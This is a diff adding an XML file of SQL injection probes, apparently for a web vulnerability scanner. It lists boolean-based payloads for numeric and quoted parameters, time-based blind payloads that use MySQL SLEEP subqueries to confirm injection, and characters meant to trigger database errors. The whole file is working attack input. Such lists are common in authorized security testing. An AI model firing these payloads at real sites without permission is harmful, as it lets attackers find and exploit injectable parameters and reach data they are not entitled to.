@@ -1,0 +1,25 @@
+<sqli>
+    <BOOLNUMDIR>
+        <item key="true1"> OR 2025=2025 LIMIT 1 -- </item>
+        <item key="true2"> OR 2021=2021 LIMIT 1 -- </item>
+        <item key="false1"> AND 2021=2025</item>
+        <item key="false2"> AND 21=25</item>
+    </BOOLNUMDIR>
+    <BOOLCHAR>
+        <item key="true1">' OR 2025=2025 LIMIT 1 -- </item>
+        <item key="true2">' OR 2021=2021 LIMIT 1 -- </item>
+        <item key="false1">' AND 2021=2025 LIMIT 1 -- </item>
+        <item key="false2">' AND 21=25 LIMIT 1 -- </item>
+    </BOOLCHAR>
+    <TIMEDIR>
+        <item key="true1">' AND (SELECT 2025 FROM (SELECT(SLEEP(5)))CQUPT) AND 'CQUPT'='CQUPT</item>
+        <item key="true2">' AND (SELECT 2021 FROM (SELECT(SLEEP(4)))CQUPT) AND 'cqupt'='cqupt</item>
+        <item key="false">' AND (SELECT 2025 FROM (SELECT(SLEEP(0)))CQUPT) AND 'CQUPT'='CQUPT</item>
+    </TIMEDIR>
+    <ERRORDIR>
+        <item>'</item>
+        <item>"</item>
+        <item>\</item>
+        <item>%BF</item>
+    </ERRORDIR>
+</sqli>
